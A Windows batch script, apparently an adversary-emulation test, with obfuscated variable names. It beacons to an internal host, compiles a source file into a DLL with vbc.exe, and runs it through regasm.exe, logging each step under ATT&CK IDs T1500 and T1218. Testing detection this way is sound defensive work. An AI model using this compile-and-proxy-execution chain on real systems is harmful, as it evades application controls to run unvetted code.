@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET recnn=%APPDATA%\8500\8eeba9f0
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?8500-7
SET lqyereup=ITZEL-S2BS
SET ufeybybm=7
SET hpnjatpj=teams.txt
SET njozco=file.txt
SET kkjwr=8500

SET uwjo=%APPDATA%\!ufeybybm!\macula-simulations.log
SET cdnu=C:\Windows\Microsoft.NET\Framework\v4.0.30319\vbc.exe
SET tvrn=%APPDATA%\!ufeybybm!
SET nrcq=C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe

echo [!DATE! !TIME!][DEBUG][!lqyereup!]: heartbeat_start=!uouoq!>> "!uwjo!" 2>nul
curl -k -s -o nul "!uouoq!"
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: heartbeat_complete=1>> "!uwjo!" 2>nul

echo [!DATE! !TIME!][DEBUG][!lqyereup!]: chdir_start=!recnn!>> "!uwjo!" 2>nul
cd /d "!recnn!" 2>nul
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: chdir_result=!errorlevel!>> "!uwjo!" 2>nul

SET qweyx=1
SET klmnn=
IF NOT EXIST "!cdnu!" (
    SET qweyx=0
    SET klmnn=compiler_not_found
)
IF NOT EXIST "!njozco!" (
    SET qweyx=0
    SET klmnn=source_not_found
)
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: compile_start=!njozco!>> "!uwjo!" 2>nul
"!cdnu!" /target:library /out:"!hpnjatpj!" "!njozco!" 2>nul
IF !ERRORLEVEL! NEQ 0 (
    SET qweyx=0
    SET klmnn=compile_failed
)
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: compile_complete=!errorlevel!>> "!uwjo!" 2>nul
echo [!DATE! !TIME!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1500|Compile After Delivery=!qweyx!:!klmnn!>> "!uwjo!" 2>nul

SET zxcvb=1
SET mnbvc=
IF NOT EXIST "!nrcq!" (
    SET zxcvb=0
    SET mnbvc=regasm_not_found
)
IF NOT EXIST "!hpnjatpj!" (
    SET zxcvb=0
    SET mnbvc=dll_not_found
)
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: regasm_start=!hpnjatpj!>> "!uwjo!" 2>nul
"!nrcq!" /U "!hpnjatpj!" 2>nul
IF !ERRORLEVEL! NEQ 0 (
    SET zxcvb=0
    SET mnbvc=execution_failed
)
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: regasm_complete=!errorlevel!>> "!uwjo!" 2>nul
echo [!DATE! !TIME!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1218|Signed Binary Proxy Execution=!zxcvb!:!mnbvc!>> "!uwjo!" 2>nul